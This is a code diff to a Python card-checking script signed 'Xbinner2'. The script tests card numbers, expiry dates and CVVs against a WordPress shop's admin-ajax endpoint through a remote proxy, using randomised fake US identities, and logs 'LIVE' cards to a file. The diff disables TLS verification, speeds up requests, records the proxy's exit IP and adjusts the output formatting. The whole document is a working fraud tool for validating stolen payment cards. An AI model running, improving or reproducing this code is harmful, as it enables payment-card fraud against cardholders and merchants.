@@ -23,6 +23,8 @@ Contact me on tg @Xbinner2"""
 amount = int(input(f"\namount=> "))
 p = input("\nproxy remote=> ")
 s = requests.Session()
+s.verify = False
+s.trust_env = False
 proxies = {"http":p,"https":p}
 s.proxies.update(proxies)
 UA = "Mozilla/5.0 (Android 13; Mobile; rv:68.0) Gecko/68.0 Firefox/107.0"
@@ -45,7 +47,9 @@ def chk(CCN, MM, YY, CVV):
     Guid = r.json()["guid"]
     Sid = r.json()["sid"]
     Muid = r.json()["muid"]
-    time.sleep(1)
+    time.sleep(0.5)
+
+    ip = s.get("https://api.ipify.org/")
 
     res = s.get(f"https://randomuser.me/api?nat=US").json()
     for x in res["results"]:
@@ -108,24 +112,27 @@ def chk(CCN, MM, YY, CVV):
         "https://signaturedjs.com/wp-admin/admin-ajax.php", headers=header, data=load
     )
     msg = rx.json()["msg"]
-
+    
+    if "false" in rx.text:
+        sys.stdout.write(f"\n{colorama.Fore.RED}[DECLINED]|{int(CCN)}|{MM}|{int(YY)}|{int(CVV)}|{msg}|{TYPE}|{BRAND}|{COU}|{ip.text}|Xbinner2\n")
+    
     if "true" in rx.text:
         sys.stdout.write(
-            f"\n{colorama.Fore.GREEN}LIVE|{int(CCN)}|{MM}|{int(YY)}|{int(CVV)}|{msg}|{TYPE}|{BRAND}|{COU}|Xbinner2\n"
+            f"\n{colorama.Fore.GREEN}LIVE|{int(CCN)}|{MM}|{int(YY)}|{int(CVV)}|{msg}|{TYPE}|{BRAND}|{COU}|{ip.text}|Xbinner2\n"
         )
         with io.open("LIVES.txt", "a") as f:
-            f.write(f"LIVE|{int(CCN)}|{MM}|{int(YY)}|{int(CVV)}|{msg}|{TYPE}|{BRAND}|{COU}|Xbinner2\n")
+            f.write(f"LIVE|{int(CCN)}|{MM}|{int(YY)}|{int(CVV)}|{msg}|{TYPE}|{BRAND}|{COU}|{ip.text}|Xbinner2\n")
 
     if "security code" in rx.text:
         sys.stdout.write(
-            f"\n{colorama.Fore.BLUE}CCN|{int(CCN)}|{MM}|{int(YY)}|{int(CVV)}|{msg}|{TYPE}|{BRAND}|{COU}|Xbinner2\n"
+            f"\n{colorama.Fore.BLUE}CCN|{int(CCN)}|{MM}|{int(YY)}|{int(CVV)}|{msg}|{TYPE}|{BRAND}|{COU}|{ip.text}|Xbinner2\n"
         )
         with io.open("CCN.txt", "a") as f:
-            f.write(f"CCN|{int(CCN)}|{MM}|{int(YY)}|{int(CVV)}|{msg}|{TYPE}|{BRAND}|{COU}|Xbinner2\n")
+            f.write(f"CCN|{int(CCN)}|{MM}|{int(YY)}|{int(CVV)}|{msg}|{TYPE}|{BRAND}|{COU}|{ip.text}|Xbinner2\n")
 
     else:
         sys.stdout.write(
-            f"\n{colorama.Fore.RED}[DECLINED]|{int(CCN)}|{MM}|{int(YY)}|{int(CVV)}|{msg}|{TYPE}|{BRAND}|{COU}|Xbinner2\n"
+            f"\n{colorama.Fore.RED}[DECLINED]|{int(CCN)}|{MM}|{int(YY)}|{int(CVV)}|{rx.text}|{TYPE}|{BRAND}|{COU}|{ip.text}|Xbinner2\n"
         )
 
 
